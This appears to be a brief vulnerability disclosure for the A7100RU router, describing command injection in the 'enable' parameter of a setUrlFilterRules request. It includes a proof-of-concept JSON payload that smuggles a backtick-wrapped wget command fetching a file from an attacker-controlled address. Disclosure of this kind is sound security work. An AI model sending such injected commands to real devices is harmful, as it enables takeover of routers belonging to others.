# A7100RU Vulnerability（CVE-2026-6027）
...
In  sub_433228 function, it reads in a user-provided parameter `enable` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `enable` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setUrlFilterRules","enable":"`wget 192.168.6.1:7777/testpoc`"
